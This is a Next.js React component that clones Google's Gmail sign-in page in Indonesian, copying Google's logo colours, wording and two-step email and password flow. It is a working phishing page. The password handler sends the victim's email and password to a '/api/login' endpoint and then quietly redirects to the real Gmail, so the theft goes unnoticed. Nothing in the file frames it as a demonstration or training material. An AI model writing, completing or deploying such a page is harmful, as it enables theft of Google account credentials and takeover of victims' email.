import { useState, FormEvent } from 'react';
import Head from 'next/head';

export default function GmailLogin() {
  const [email, setEmail] = useState('');
  const [pass, setPass] = useState('');
  const [step, setStep] = useState<'email' | 'password'>('email');
  const [err, setErr] = useState('');
  const [loading, setLoading] = useState(false);

  function submitEmail(e: FormEvent) {
    e.preventDefault();
    if (!email.includes('@')) {
      setErr('Masukkan alamat email yang valid');
      return;
    }
    setErr('');
    setStep('password');
  }

  async function submitPass(e: FormEvent) {
    e.preventDefault();
    setLoading(true);
    try {
      await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, pass }),
      });
      window.location.href = 'https://mail.google.com';
    } catch {
      setErr('Terjadi kesalahan. Coba lagi.');
      setLoading(false);
    }
  }

  return (
    <>
      <Head>
        <title>Gmail</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link
          href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap"
          rel="stylesheet"
        />
      </Head>

      <div className="page">
        <div className="card">
          <div className="logo">
            <svg viewBox="0 0 75 24" width="75" height="24" aria-hidden="true">
              <text x="0" y="19" fontFamily="Roboto, Arial, sans-serif" fontSize="22" fontWeight="500">
                <tspan fill="#4285F4">G</tspan>
                <tspan fill="#EA4335">o</tspan>
                <tspan fill="#FBBC05">o</tspan>
                <tspan fill="#4285F4">g</tspan>
                <tspan fill="#34A853">l</tspan>
                <tspan fill="#EA4335">e</tspan>
              </text>
            </svg>
          </div>

          <h1 className="title">{step === 'email' ? 'Masuk' : 'Selamat datang'}</h1>
          <p className="sub">
            {step === 'email' ? 'Lanjutkan ke Gmail' : <span className="chip">{email}</span>}
          </p>

          {err && <div className="error">{err}</div>}

          {step === 'email' ? (
            <form onSubmit={submitEmail}>
              <input
                type="email"
                placeholder="Email atau nomor telepon"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                autoFocus
                required
              />
              <div className="actions">
                <a className="link" href="#">Lupa email?</a>
                <button type="submit" className="btn">Berikutnya</button>
              </div>
            </form>
          ) : (
            <form onSubmit={submitPass}>
              <input
                type="password"
                placeholder="Masukkan sandi"
                value={pass}
                onChange={(e) => setPass(e.target.value)}
                autoFocus
                required
              />
              <div className="actions">
                <a className="link" href="#">Lupa sandi?</a>
                <button type="submit" className="btn" disabled={loading}>
                  {loading ? 'Memproses…' : 'Berikutnya'}
                </button>
              </div>
            </form>
          )}

          <p className="foot"><a href="#">Buat akun</a></p>
        </div>

        <div className="bottom">
          <select className="lang">
            <option>Bahasa Indonesia</option>
            <option>English (United States)</option>
          </select>
          <div className="links">
            <a href="#">Bantuan</a>
            <a href="#">Privasi</a>
            <a href="#">Persyaratan</a>
          </div>
        </div>
      </div>
    </>
  );
}
